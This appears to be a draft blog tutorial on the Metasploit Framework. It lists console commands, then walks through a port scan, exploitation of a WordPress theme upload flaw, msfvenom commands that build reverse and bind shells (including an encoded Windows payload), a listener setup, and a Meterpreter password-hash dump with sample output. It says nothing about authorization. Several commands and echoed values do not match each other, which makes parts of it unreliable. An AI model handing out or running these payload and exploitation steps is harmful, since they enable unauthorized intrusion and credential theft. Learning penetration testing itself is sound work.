---
layout: post
published: false
title: Metasploit Framework 7.2
---
## Metasploit In Action


## Introduction 

_**In this blog post we will discuss and use some modules to learn metasploit-framework usage.**_ 


**Metasploit Commands and Interaction**

Lauch msfconsole and follow bellow commands

```
# msfconsole
```
Now you're in metasploit-framework playground.

To know all commands about metasploit-framework simple execute 'help' in msfconsole

```
msf5 > help

```
And the result will be awesome, I suggest you to read everything from their because we will use them ahead.


**Mentioning some important commands:**

```
Core Commands
=============

    Command       Description
    -------       -----------
    ?             Help menu
    banner        Display an awesome metasploit banner
    cd            Change the current working directory
    color         Toggle color
    connect       Communicate with a host
    exit          Exit the console
    get           Gets the value of a context-specific variable
    getg          Gets the value of a global variable
    grep          Grep the output of another command
    help          Help menu
    history       Show command history
    load          Load a framework plugin
    quit          Exit the console
    repeat        Repeat a list of commands
    route         Route traffic through a session
    save          Saves the active datastores
    sessions      Dump session listings and display information about sessions
    set           Sets a context-specific variable to a value
    setg          Sets a global variable to a value
    sleep         Do nothing for the specified number of seconds
    spool         Write console output into a file as well the screen
    threads       View and manipulate background threads
    tips          Show a list of useful productivity tips
    unload        Unload a framework plugin
    unset         Unsets one or more context-specific variables
    unsetg        Unsets one or more global variables
    version       Show the framework and console library version numbers

```

```

Module Commands
===============

    Command       Description
    -------       -----------
    advanced      Displays advanced options for one or more modules
    back          Move back from the current context
    clearm        Clear the module stack
    info          Displays information about one or more modules
    listm         List the module stack
    loadpath      Searches for and loads modules from a path
    options       Displays global options or for one or more modules
    popm          Pops the latest module off the stack and makes it active
    previous      Sets the previously loaded module as the current module
    pushm         Pushes the active or list of modules onto the module stack
    reload_all    Reloads all modules from all defined module paths
    search        Searches module names and descriptions
    show          Displays modules of a given type, or all modules
    use           Interact with a module by name or search term/index

```

```

Job Commands
============

    Command       Description
    -------       -----------
    handler       Start a payload handler as job
    jobs          Displays and manages jobs
    kill          Kill a job
    rename_job    Rename a job

```
```
Resource Script Commands
========================

    Command       Description
    -------       -----------
    makerc        Save commands entered since start to a file
    resource      Run the commands stored in a file

```

```
Database Backend Commands
=========================

    Command           Description
    -------           -----------
    analyze           Analyze database information about a specific address or address range
    db_connect        Connect to an existing data service
    db_disconnect     Disconnect from the current data service
    db_export         Export a file containing the contents of the database
    db_import         Import a scan result file (filetype will be auto-detected)
    db_nmap           Executes nmap and records the output automatically
    db_rebuild_cache  Rebuilds the database-stored module cache (deprecated)
    db_remove         Remove the saved data service entry
    db_save           Save the current data service connection as the default to reconnect on startup
    db_status         Show the current data service status
    hosts             List all hosts in the database
    loot              List all loot in the database
    notes             List all notes in the database
    services          List all services in the database
    vulns             List all vulnerabilities in the database
    workspace         Switch between database workspaces

```

```

Credentials Backend Commands
============================

    Command       Description
    -------       -----------
    creds         List all credentials in the database
```

```
Developer Commands
==================

    Command       Description
    -------       -----------
    edit          Edit the current module or a file with the preferred editor
    irb           Open an interactive Ruby shell in the current context
    log           Display framework.log paged to the end if possible
    pry           Open the Pry debugger on the current module or Framework
    reload_lib    Reload Ruby library files from specified paths

```

```
Examples

Terminate the first sessions:

    sessions -k 1

Stop some extra running jobs:

    jobs -k 2-6,7,8,11..15

Check a set of IP addresses:

    check 127.168.0.0/16, 127.0.0-2.1-4,15 127.0.0.255

Target a set of IPv6 hosts:

    set RHOSTS fe80::3990:0000/110, ::1-::f0f0

Target a block from a resolved domain name:

    set RHOSTS www.example.test/24

```

**Read them and use them to learn.**



**Scanning using metasploit**


Lets scan ports using metasploit

```
# msfconsole
```

```
msf5 > search portscan

Matching Modules
================

   #  Name                                              Disclosure Date  Rank    Check  Description
   -  ----                                              ---------------  ----    -----  -----------
   0  auxiliary/scanner/http/wordpress_pingback_access                   normal  No     Wordpress Pingback Locator
   1  auxiliary/scanner/natpmp/natpmp_portscan                           normal  No     NAT-PMP External Port Scanner
   2  auxiliary/scanner/portscan/ack                                     normal  No     TCP ACK Firewall Scanner
   3  auxiliary/scanner/portscan/ftpbounce                               normal  No     FTP Bounce Port Scanner
   4  auxiliary/scanner/portscan/syn                                     normal  No     TCP SYN Port Scanner
   5  auxiliary/scanner/portscan/tcp                                     normal  No     TCP Port Scanner
   6  auxiliary/scanner/portscan/xmas                                    normal  No     TCP "XMas" Port Scanner
   7  auxiliary/scanner/sap/sap_router_portscanner                       normal  No     SAPRouter Port Scanner
```

**Lets use port TCP ACK Firewall Scanner to scan target network**

```
msf > use auxiliary/scanner/portscan/ack

msf5 auxiliary(scanner/portscan/ack) > show options

Module options (auxiliary/scanner/portscan/ack):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   BATCHSIZE  256              yes       The number of hosts to scan per set
   DELAY      0                yes       The delay between connections, per thread, in milliseconds
   INTERFACE                   no        The name of the interface
   JITTER     0                yes       The delay jitter factor (maximum value by which to +/- DELAY) in milliseconds.
   PORTS      1-10000          yes       Ports to scan (e.g. 22-25,80,110-900)
   RHOSTS                      yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   SNAPLEN    65535            yes       The number of bytes to capture
   THREADS    1                yes       The number of concurrent threads (max one per host)
   TIMEOUT    500              yes       The reply read timeout in milliseconds

```

**Now we have to set required things to scan our target**

```

msf5 auxiliary(scanner/portscan/ack) > set INTERFACE eth0
INTERFACE => eth0
msf5 auxiliary(scanner/portscan/ack) > set PORTS 80
PORTS => 80
msf5 auxiliary(scanner/portscan/ack) > set RHOSTS 192.168.1.0/12
RHOSTS => 192.168.1.0/24
msf5 auxiliary(scanner/portscan/ack) > set THREADS 50
THREADS => 50
msf5 auxiliary(scanner/portscan/ack) > run

```

Now this will give you scan result


**Target exploitation with metasploit**


Run 'msfconsole'

```
# msfconsole

msf5 > show exploits
```

**This will list all the exploits in database, choose any to see the usage.**

For example, i found a wordpress vulnerabilty in a unix server, called latform Theme File Upload Vulnerability.

```
msf5 > use exploit/unix/webapp/wp_platform_exec
msf5 exploit(unix/webapp/wp_platform_exec) > show options

```
```
msf5 exploit(unix/webapp/wp_platform_exec) > show options

Module options (exploit/unix/webapp/wp_platform_exec):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS     10.10.10.35      yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT      80               yes       The target port (TCP)
   SSL        false            no        Negotiate SSL/TLS for outgoing connections
   TARGETURI  /                yes       The base path to the wordpress application
   VHOST                       no        HTTP server virtual host


Exploit target:

   Id  Name
   --  ----
   0   platform < 1.4.4, platform pro < 1.6.2

```

Now set exploit

```
msf5 exploit(unix/webapp/wp_platform_exec) > set RHOST 10.10.10.35
RHOST => 10.10.10.35
msf5 exploit(unix/webapp/wp_platform_exec) > set RPORT 80
RPORT => 80
msf5 exploit(unix/webapp/wp_platform_exec) > set TARGETURI 10.10.10.35/wp_plugin
TARGETURI => 10.10.10.35/wp_plugin
msf5 exploit(unix/webapp/wp_platform_exec) > run

[*] Started reverse TCP handler on 192.168.43.209:4444 
[*] Uploading payload
```

And this will exploit the vulnerabilty on the target and you will get meterpreter shell on your metasploit-framework.


**Msfvenom**

Its my personal favourite, i will explain to use it in my way.

```
msfvenom -l
```


Lets create a windows reverse TCP shell


Launch your terminal and execute command below

```
msfvenom -p windows/shell/reverse_tcp LHOST=<Local IP Address> LPORT=<Local Port> -f exe > hackershell.exe
```
To create encoded windows reverse TCP shell

```
msfvenom -p windows/meterpreter/reverse_tcp -e shikata_ga_nai -i 3 -f exe > enchackershell.exe
```
To create linux Bind Shell

```
msfvenom -p generic/shell_bind_tcp RHOST=<Remote IP Address> LPORT=<Local Port> -f elf > hacker.elf
```


To create linux Meterpreter Reverse Shell

```
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<Local IP Address> LPORT=<Local Port> -f elf > hacker.elf
```

To create linux Bind Meterpreter Shell

```
msfvenom -p linux/x86/meterpreter/bind_tcp RHOST=<Remote IP Address> LPORT=<Local Port> -f elf > hacker.elf
```



To create PHP Meterpreter Reverse TCP

```
msfvenom -p php/meterpreter_reverse_tcp LHOST=<Local IP Address> LPORT=<Local Port> -f raw > hackershell.php

cat shell.php | pbcopy && echo ‘<?php ‘ | tr -d ‘\n’ > shell.php && pbpaste >> shell.php
```

To create ASP Meterpreter Reverse TCP

```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Local IP Address> LPORT=<Local Port> -f asp > shell.asp
```

To create JSP Java Meterpreter Reverse TCP

```
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<Local IP Address> LPORT=<Local Port> -f raw > shell.jsp
```



To create Python Reverse Shell
msfvenom -p cmd/unix/reverse_python LHOST=<Local IP Address> LPORT=<Local Port> -f raw > shell.py

To create Bash Unix Reverse Shell

```
msfvenom -p cmd/unix/reverse_bash LHOST=<Local IP Address> LPORT=<Local Port> -f raw > shell.sh
```


**To use them in target system first upload a payload based on target interface and start multi/handler in your msfconsole**


'''
# msfconsole

msf5 > use exploit/multi/handler
msf5 exploit(multi/handler) > set PAYLOAD <Payload name>
msf5 exploit(multi/handler) > Set RHOST <Remote IP>
msf5 exploit(multi/handler) > set LHOST <Local IP>
msf5 exploit(multi/handler) > set LPORT <Local Port>
msf5 exploit(multi/handler) > Run

  ```
  
Boom you will get meterpreter shell easily

After getting meterpreter shell run 'help' command it will show what you can do in target system

```
meterpreter > help
```

To list all run commands in target system execute 'run tab+tab' and enter it will show all run commands.

To dump all target system user hashes use

```
meterpreter > run post/windows/gather/hashdump 

[*] Obtaining the boot key...
[*] Calculating the hboot key using SYSKEY 8528c78df7ff55040196a9b670f114b6...
[*] Obtaining the user list and keys...
[*] Decrypting user keys...
[*] Dumping password hashes...

Administrator:500:b512c1f3a8c0e7241aa818381e4e751b:1891f4775f676d4d10c09c1225a5c0a3:::
dook:1004:81cbcef8a9af93bbaad3b435b51404ee:231cbdae13ed5abd30ac94ddeb3cf52d:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
HelpAssistant:1000:9cac9c4683494017a0f5cad22110dbdc:31dcf7f8f9a6b5f69b9fd01502e6261e:::
SUPPORT_388945a0:1002:aad3b435b51404eeaad3b435b51404ee:36547c5a8a3de7d422a026e51097ccc9:::
victim:1003:81cbcea8a9af93bbaad3b435b51404ee:561cbdae13ed5abd30aa94ddeb3cf52d:::
meterpreter >

```




## Conclusion

_**I have explained basic use cases of metasploit-framework, because its a all in one platform to perform penetration test look also in offsec free [metasploit unleashed training](https://www.offensive-security.com/metasploit-unleashed/).
